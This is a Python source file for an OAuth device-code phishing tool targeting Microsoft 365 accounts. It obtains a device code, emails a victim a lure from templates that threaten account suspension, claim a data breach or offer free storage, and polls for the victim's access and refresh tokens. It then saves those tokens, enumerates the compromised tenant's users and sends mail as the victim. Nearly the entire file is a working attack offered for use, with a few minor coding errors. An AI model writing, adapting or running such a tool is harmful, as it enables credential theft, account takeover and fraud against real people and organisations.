#!/usr/bin/enc python3
"""Author = Vishal Raj
   Version = 1.0
   Year = 2024
   Linkedin = www.linkedin.com/in/vishal-raj007
"""
#importing all the necessary modules
import requests
import json
import time
import threading
import platform
import subprocess
import argparse
from AADInternals import AzureEnum
from mail import send_email

class TextColor:
  RED = '\033[91m'
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  BLUE = '\033[94m'
  MAGENTA = '\033[95m'
  CYAN = '\033[96m'
  RESET = '\033[0m'  # Reset to default color

class OAuthPhishing(TextColor):
  def __init__(self):
    self.OAuth_token = None
    self.auth_response = None
  
  @staticmethod
  def banner():
    banner = TextColor.YELLOW + """
        ██████╗░░█████╗░██╗░░░██╗██████╗░
        ██╔══██╗██╔══██╗██║░░░██║██╔══██╗
        ██║░░██║██║░░██║██║░░░██║██████╔╝
        ██║░░██║██║░░██║██║░░░██║██╔══██╗
        ██████╔╝╚█████╔╝╚██████╔╝██║░░██║
        ╚═════╝░░╚════╝░░╚═════╝░╚═╝░░╚═╝
        
        OAuth Device Code Authentication
        Office 365 Phishing Technique Project
        By Vishal Raj
        """ + TextColor.RESET
    print(banner)
  
  def retrieve_auth_code(self):
    self.url = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
    self.payload = {
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "resource": "https://graph.windows.net"
    }

    try:
      print(TextColor.MAGENTA + "#" * 90)
      print("##\t\t1. Requesting Azure OAuth Server for user_code and device_Code\t\t##")
      print("#" * 90 + TextColor.RESET)
      self.response01 = requests.post(self.url, data=self.payload)
    except requests.RequestException as e:
      print(TextColor.RED + f"[-] An error occured:{e}")
      return None

    if self.response01.status_code == 200:
      self.auth_response = self.response01.json()
      print(TextColor.BLUE + f'User Code: {self.auth_response.get("user_code")}')
      print(self.auth_response.get("message") + TextColor.RESET)

      with open('auth_response.json', 'w') as file:
        json.dump(self.auth_response, file, indent=4)
        print(TextColor.CYAN + "[+] Auth response saved to auth_response.json\n" + TextColor.RESET)
        return self.auth_response
    else:
        print(TextColor.RED + f"[-] Request failed with status code {response.status_code}"+ TextColor.RESET)
        return None

  def send_mail(self, sender_email, receiver_email, password, name):
    try:
      print(TextColor.MAGENTA + "#" * 50)
      print("##\t\t2. Send Phish Email\t\t##")
      print("#" * 50 + TextColor.RESET)
      print("1.) Freebies of 1TB free Cloud Storage\n2.) Threat of Account Suspension or Deactivation\n3.) Alleged Data Breach or Security Threats")
      self.template_options = {
      1: "Template01", # Freebies of 1TB free Cloud Storage
      2: "Template02", # Threat of Account Suspension or Deactivation
      3: "Template03", # Alleged Data Breach or Security Threats
      }
      self.template = int(input("Select the Phishing Template: "))
      self.templateName = self.template_options.get(self.template)
      if self.templateName is None:
        print("[-] Please select the correct option...")
        exit(1)
      with open(self.templateName, 'r') as file:
          self.data = json.load(file)
          self.subject = self.data['Subject']
          self.message = self.data['Message']
          self.message = self.message.replace('Name', name)
          self.message = self.message.replace('User_code', self.auth_response.get("user_code"))
          print("Sending mail...", end='\r')
          send_email(self.subject, self.message, sender_email, receiver_email, password)
    except KeyboardInterrupt:
      print("\nKeybord Intruption:\nQuitting the process....")
      time.sleep(1)
      exit(1)


  def retrieve_auth_token(self):
    body = {
          "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
          "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
          "code": self.auth_response["device_code"],
          "resource": "https://graph.windows.net"
          }
    self.response02 = None
    try:
      self.response02 = requests.post("https://login.microsoftonline.com/common/oauth2/token?api-version=1.0", data=body)
    except self.requests.RequestException as e:
      print(TextColor.RED + f"[-] An error occurred:{e}" + TextColor.RESET)
      return None

    if self.response02 and self.response02.status_code == 200:
      print(TextColor.GREEN + "\n[+] Ahhh! It appears we've hooked a phishing attempt – looks like someone's phishing for trouble!🎣🎣"+ TextColor.RESET)

      with open('auth_token.json', 'w') as file:
        json.dump(self.response02.json(), file, indent=4)
        print(TextColor.CYAN +"[+] access_token and refresh_token saved to auth_token.json"+ TextColor.RESET)

      self.OAuth_token = self.response02.json()

  def pull_OAuth_token(self):
    print()
    print(TextColor.MAGENTA + '#' * 66)
    print("##\t\t3. waiting for User to Authenticate....\t\t##")
    print('#' * 66 + TextColor.RESET)
    self.duration = int(self.auth_response["expires_in"])
    try:
      while self.duration:
        if self.duration % 10 == 0:
          # Every 10 seconds, we send a request to the OAuth server to request an access_token and refresh_token by providing the device_code.
          self.token_thread = threading.Thread(target=self.retrieve_auth_token)
          self.token_thread.start()
        self.mins, self.secs = divmod(self.duration, 60)
        # Waiting for User to Authenticate(Timer 15 minutes)
        print("Remaining time for user authentication: ", end='')
        self.timer_display = f"{self.mins:02d}:{self.secs:02d}"
        print(self.timer_display, end='\r')  # \r to overwrite the previous output in the same line
        time.sleep(1)
        self.duration -= 1
        if self.OAuth_token:
          return self.OAuth_token
        else:
          pass
      if self.duration == 0:
        print(TextColor.RED + "\n[-] Timeout Occure"+ TextColor.RESET)
        exit(1)

    except KeyboardInterrupt:
      print("\nKeybord Intruption:")
      print('Quitting the process....')
      time.sleep(1)
      exit(1)

def get_args():
    parser = argparse.ArgumentParser(description="OAuth Device Code Phishing Attack")
    parser.add_argument("-m", "--mail", dest="email", action='store_true',
                        help="Send a phishing email to the victim")
    parser.add_argument("-s", "--sender", type=str, metavar="Sender_email",
                        help="Sender's email address")
    parser.add_argument("-p", "--passwd", type=str, metavar="Sender_password",
                        help="Sender's email password. If you are using Gmail, please provide an 'app password' instead.")
    parser.add_argument("-r", "--receiver", type=str, metavar="Recipient_email",
                        help="Recipient's email address")                    
    parser.add_argument("-n", "--name", type=str, metavar="Recipient_name",
                        help="Recipient's name")
    args = parser.parse_args()
    if args.email:
        if not (args.sender and args.receiver and args.passwd and args.name):
            parser.error(TextColor.RED +"[-] Please specify the sender's email, sender's password, recipient's email, and recipient's name when sending an email."+ TextColor.RESET)
    return args

def main():
  args = get_args()
  dca=OAuthPhishing()
  # print banner
  dca.banner()
  # Send a request to the Azure OAuth server for user_code, device_code, and verification_url
  auth_response = dca.retrieve_auth_code()
  if auth_response:
    # If the user uses the '--mail', '-m' parameter
    if args.email:
      dca.send_mail(args.sender, args.receiver, args.passwd, args.name)
    # Wait for the victim to authenticate and attempt to pull OAuth_tokens from the OAuth server after authentication. 
    auth_token = dca.pull_OAuth_token()
    access_token = auth_token.get('access_token')
    refresh_token = auth_token.get('refresh_token')
    # Use the AADInternals tool to enumerate the victim's compromised Tenant 
    enum = AzureEnum(access_token, refresh_token)
    if platform.system() == 'Linux': enum.check_powershell()
    enum.check_AADInternals_module()
    # Enumerate all user's information from the Azure Tenant.
    enum.enum_users()
    # request access_token for Microsoft Exchang eOnline 
    enum.exchange_online()
    # Send an Email using exchangeOnline access_token
    enum.send_email()

  else:
    exit(1)

if __name__=='__main__':
  main()
